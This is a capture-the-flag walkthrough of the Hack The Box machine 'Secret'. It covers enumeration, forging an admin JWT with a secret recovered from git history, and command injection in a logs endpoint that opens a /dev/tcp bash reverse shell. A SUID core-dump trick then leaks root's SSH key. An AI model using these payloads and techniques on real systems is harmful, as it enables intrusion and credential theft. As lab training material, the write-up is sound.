# [Secret](https://app.hackthebox.com/machines/Secret)

```bash
nmap -p- --min-rate 10000 10.10.11.120 -Pn
```

![alt text](img/image.png)

After detection of open ports, let's do greater nmap scan here.

```bash
nmap -A -sC -sV -p22,80 10.10.11.120 -Pn 
```

![alt text](img/image-1.png)

Our web application is like below.

![alt text](img/image-2.png)

Let's do `Directory Enumeration` for this web application.

```bash
gobuster dir -u http://10.10.11.120/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 40
```

![alt text](img/image-3.png)


Let's create account via `API` by sending request to `/api/user/register`
```bash
curl -d '{"name":"dr4ks123","email":"dr4ks123@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: application/json'
```

![alt text](img/image-4.png)


After successful registration, we can make authentication by sending request to `/api/user/login`.

```bash
curl -d '{"email":"dr4ks123@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/login -H 'Content-Type: application/json'
```

![alt text](img/image-5.png)


I can see my `JWT` token already.


Via sending request to `/api/priv` , we can see privileges of our user.
```bash
curl -s 'http://10.10.11.120/api/priv' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NWQwOGM0ODUwNGZmMDA0NWI4N2YyOTMiLCJuYW1lIjoiZHI0a3MxMjMiLCJlbWFpbCI6ImRyNGtzMTIzQHNlY3JldC5jb20iLCJpYXQiOjE3MDgxNjY1NTZ9.SEZ5ohQHoWDKwhZsEQjGmA1nKl0rp2xlzMHpwuTXTEc" 
```

![alt text](img/image-6.png)


As you see, my user is not `admin` user.


While I try to use [JWT Decoder](https://jwt.io/), I can see my `payload` data from this `JWT` token.

![alt text](img/image-7.png)



Now, it's time to download `Source Code`.

![alt text](img/image-8.png)


I found `.git` directory here.

![alt text](img/image-9.png)


Let's look at `Git` history via `git log` command.
```bash
git log --name-only --oneline
```

![alt text](img/image-10.png)


From last commits, I see that there was `.env` file contains secret info, let's `commit` back via `git checkout` command.
```bash
git checkout de0a46b
```

![alt text](img/image-11.png)


Content of `.env` file is below.

![alt text](img/image-12.png)


Token=> gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE


Let's decode via `Python's JWT` library.
```bash
import jwt
token=your_jwt_token
secret=you_get_this_from_.env
jwt.decode(token, secret, options={"verify_signature": False})
```

![alt text](img/image-13.png)


Let's do `Forge JWT` attack which means, as know `secret` value of `JWT` token, we can create ourselves `JWT` token.

```bash
j=jwt.decode(token, secret, algorithms=["HS256", "RS256"])
j['name']='theadmin'
jwt.encode(j,secret)
```

![alt text](img/image-14.png)


Let's check that we created `JWT Token` or not via sending request to `/api/priv` endpoint.
```bash
curl -s 'http://10.10.11.120/api/priv' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NWQwOGM0ODUwNGZmMDA0NWI4N2YyOTMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRyNGtzMTIzQHNlY3JldC5jb20iLCJpYXQiOjE3MDgxNjc3MzB9.yhnx0CfdiEQux39ocTNc6PdX0SPufn0JO06wNeX4roU"
```

![alt text](img/image-15.png)


As we have `admin` user , we can do whatever we want.

While reading `Source Code` of application, I see that there can be `Command Injection`.

![alt text](img/image-16.png)


Let's fuzz `name` parameter via `ping` command execution by sending request.
```bash
curl -s 'http://10.10.11.120/api/logs?file=;ping+-c+1+10.10.14.2' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NWQwOGM0ODUwNGZmMDA0NWI4N2YyOTMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRyNGtzMTIzQHNlY3JldC5jb20iLCJpYXQiOjE3MDgxNjc3MzB9.yhnx0CfdiEQux39ocTNc6PdX0SPufn0JO06wNeX4roU"
```

![alt text](img/image-17.png)



I can also inject command execution payloads into `file` parameter for `/api/logs` endpoint.
```bash
curl -s 'http://10.10.11.120/api/logs?file=;id' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NWQwOGM0ODUwNGZmMDA0NWI4N2YyOTMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRyNGtzMTIzQHNlY3JldC5jb20iLCJpYXQiOjE3MDgxNjc3MzB9.yhnx0CfdiEQux39ocTNc6PdX0SPufn0JO06wNeX4roU" | jq -r .
```

![alt text](img/image-18.png)


As you see, we can see output of this request clearly, let's add reverse shell into here.
```bash
/dev/null;bash -c 'bash -i >& /dev/tcp/10.10.14.2/1337 0>&1'
```

Now, I send request as below and I need to add `--data-urlencode` option to make exploit work.
```bash
curl -s -G 'http://10.10.11.120/api/logs' --data-urlencode "file=>/dev/null;bash -c 'bash -i >& /dev/tcp/10.10.14.2/1337 0>&1'" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NWQwOGM0ODUwNGZmMDA0NWI4N2YyOTMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRyNGtzMTIzQHNlY3JldC5jb20iLCJpYXQiOjE3MDgxNjc3MzB9.yhnx0CfdiEQux39ocTNc6PdX0SPufn0JO06wNeX4roU" | jq -r .
```


Hola, I got reverse shell from port `1337`.

![alt text](img/image-19.png)


Let's make interactive shell.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo;fg
export TERM=xterm
export SHELL=bash
```

![alt text](img/image-20.png)


user.txt

![alt text](img/image-21.png)


I searched `SUID` files via below command.
```bash
find / -perm -u=s -type f 2>/dev/null
```

![alt text](img/image-22.png)


There I find `/opt/crash` binary and try to execute this.

After looking at source code means `code.c` , I find a path for hijacking.

![alt text](img/image-23.png)

It's like below.
```bash
#enter /root/.ssh/id_rsa
kill -SIGSEGV `ps -e | grep -w "count" |awk -F ' ' '{print$1}'`
fg
apport-unpack _opt_count.1000.crash /tmp/crash_unpacked
strings CoreDump
```

![alt text](img/image-24.png)


I find `private key` file called `id_rsa`.

![alt text](img/image-25.png)

Let's get this and give `chmod 600 id_rsa` privilege and join into machine.


root.txt

![alt text](img/image-26.png)